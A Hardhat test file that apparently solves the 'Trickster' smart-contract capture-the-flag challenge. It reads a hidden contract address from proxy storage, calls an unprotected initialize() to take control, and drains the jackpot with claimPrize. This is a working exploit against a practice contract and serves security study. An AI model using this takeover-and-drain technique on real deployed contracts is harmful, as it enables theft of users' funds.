import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { BigNumber, Contract, utils } from "ethers";
import { ethers } from "hardhat";

describe("Trickster", () => {
  let _owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let tx: TransactionResponse;

  beforeEach(async () => {
    [_owner, attacker] = await ethers.getSigners();

    const factory = await (await ethers.getContractFactory("ChallengeTricksterFactory")).deploy();

    tx = await factory.deploy(_owner.address, { value: utils.parseEther("0.0001") });
    await tx.wait();

    const contractAddress = await factory.challenge();
    contract = (await ethers.getContractFactory("JackpotProxy")).attach(contractAddress);
  });

  it("Solves the challenge", async () => {
    // Get the jackpot contract address
    let jackpotAddress = await ethers.provider.getStorageAt(contract.address, 1);
    jackpotAddress = "0x" + jackpotAddress.substring(26);

    const jackpot = (await ethers.getContractFactory("Jackpot", attacker)).attach(jackpotAddress);

    // Call initialize to set the attacker as the new "jackpotProxy" to bypass validation
    tx = await jackpot.initialize(attacker.address);
    await tx.wait();

    // Withdraw funds
    const value = ethers.utils.parseEther("0.0001");
    tx = await jackpot.claimPrize(value, { value });
    await tx.wait();

    const balance = (await contract.balance()) as BigNumber;
    expect(balance.isZero()).to.be.true;
  });
});
